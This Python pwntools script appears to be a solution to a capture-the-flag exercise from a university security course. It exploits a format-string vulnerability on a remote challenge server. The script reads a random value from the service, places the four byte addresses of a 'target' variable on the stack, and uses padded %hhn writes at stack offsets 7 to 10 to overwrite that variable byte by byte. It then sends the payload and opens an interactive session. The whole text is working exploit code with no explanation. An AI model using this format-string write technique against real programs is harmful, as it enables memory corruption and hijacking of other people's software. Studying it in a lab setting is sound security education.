# SSof{Random_will_not_beat_me}
from pwn import *
import re

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22196

elf = ELF("bin")
target_address = elf.symbols['target']

### run a remote process
s = remote(SERVER, PORT, timeout=9999)
# s = process('./check', shell=True)

txt = s.recv().decode("utf-8")
print(txt)
x = re.search(r"0x.+\n", txt)
goal = int(x.group().replace("0x", ""), 16)
print(hex(goal))
goal0 = goal & 0xff
goal1 = (goal>>8) & 0xff
goal2 = (goal>>16) & 0xff
goal3 = (goal>>24) & 0xff
print(hex(goal0), hex(goal1), hex(goal2), hex(goal3))


### interact with it

msg = b""

msg += p32(target_address)
msg += p32(target_address+1)
msg += p32(target_address+2)
msg += p32(target_address+3)


## first byte
padding = str(goal0-len(msg))
print("Padding: ", hex(int(padding)))

total_output = int(padding) + len(msg)
print(hex(int(total_output)))
msg += b"%0"+ bytes(padding, "utf-8") + b"x"
msg += b"%7$hhn"

## second byte
padding = str((goal1 + 0x100 - total_output)%0x100)
print("Padding: ", hex(int(padding)))

msg += b"%0"+ bytes(padding, "utf-8") + b"x"
msg += b"%8$hhn"
total_output += int(padding)
print(hex(int(total_output)))

## third byte
padding = str((goal2 + 0x100 -total_output)%0x100)
print("Padding: ", hex(int(padding)))

msg += b"%0"+ bytes(padding, "utf-8") + b"x"
msg += b"%9$hhn"
total_output += int(padding)
print(hex(int(total_output)))


## four byte
padding = str((goal3 + 0x100 - total_output)%0x100)
print("Padding: ", hex(int(padding)))

msg += b"%0"+ bytes(padding, "utf-8") + b"x"
msg += b"%10$hhn"
total_output += int(padding)
print(hex(int(total_output)))


# msg = b"AAAA"*4
# msg += b".%08x" * 10

print(msg)
# s.send(msg + b'\n')
s.sendline(msg)

# print(s.recv())
# s.recvall()
s.interactive()

